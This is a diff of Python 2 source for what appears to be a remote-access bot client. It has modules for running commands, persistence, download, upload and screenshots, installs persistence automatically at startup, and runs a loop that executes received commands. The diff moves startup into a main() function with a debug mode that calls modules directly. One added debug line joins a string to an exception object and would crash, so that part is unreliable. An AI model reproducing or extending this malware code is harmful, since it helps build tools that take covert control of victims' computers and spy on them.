@@ -16,6 +16,7 @@ from modules import upload
 from modules import screenshot
 
 
+#MODULES = ['runcmd', 'persistence', 'download', 'upload', 'screenshot']
 MODULES = ['runcmd', 'persistence', 'download', 'upload', 'screenshot']
 if not settings.BOT_ID:
     settings.BOT_ID = socket.gethostname()
@@ -43,8 +44,15 @@ General commands:
 
     utils.send_output(help_text)
 
+def main(args):
+    if settings.DEBUG:
+        if len(args) > 0 and args[0] in MODULES:
+            if len(args) > 1 and args[1] == "help":
+                print(sys.modules["modules.%s" % args[0]].help())
+            else:
+                print(sys.modules["modules.%s" % args[0]].run(*args[1:]))
+            sys.exit()
 
-if __name__ == "__main__":
     time.sleep(settings.PAUSE_AT_START)
     if settings.AUTO_PERSIST:
         persistence.install()
@@ -60,7 +68,7 @@ if __name__ == "__main__":
             cmdargs = command.split(" ")
             if command:
                 if settings.DEBUG:
-                    print command
+                    print "Command: " + command
                 if cmdargs[0] == "cd":
                     os.chdir(os.path.expandvars(" ".join(cmdargs[1:])))
                 elif cmdargs[0] in MODULES:
@@ -79,4 +87,7 @@ if __name__ == "__main__":
         except Exception, exc:
             is_idle = True
             if settings.DEBUG:
-                print exc
+                print "Exception: " + exc
+
+if __name__ == "__main__":
+    main(sys.argv[1:])
